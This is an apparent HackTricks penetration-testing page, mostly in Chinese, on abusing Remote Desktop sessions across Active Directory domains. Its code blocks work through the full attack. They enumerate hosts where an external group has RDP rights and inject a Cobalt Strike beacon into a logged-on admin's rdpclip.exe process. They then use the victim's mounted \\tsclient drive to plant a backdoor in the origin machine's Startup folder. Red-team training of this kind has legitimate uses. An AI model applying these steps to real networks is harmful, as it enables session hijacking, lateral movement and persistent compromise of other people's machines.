# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP 进程注入

如果 **外部组** 对当前域中的任何 **计算机** 具有 **RDP 访问权限**，则 **攻击者** 可以 **入侵该计算机并等待他**。

一旦该用户通过 RDP 访问，**攻击者可以转移到该用户的会话** 并滥用其在外部域中的权限。
```powershell
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
检查 **其他工具窃取会话的其他方法** [**在此页面。**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

如果用户通过 **RDP 访问一台机器**，而 **攻击者** 正在 **等待** 他，攻击者将能够 **在用户的 RDP 会话中注入一个信标**，如果 **受害者在通过 RDP 访问时挂载了他的驱动器**，**攻击者可以访问它**。

在这种情况下，你可以通过在 **启动文件夹** 中写入一个 **后门** 来 **妥协** **受害者的原始计算机**。
```powershell
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
{{#include ../../banners/hacktricks-training.md}}
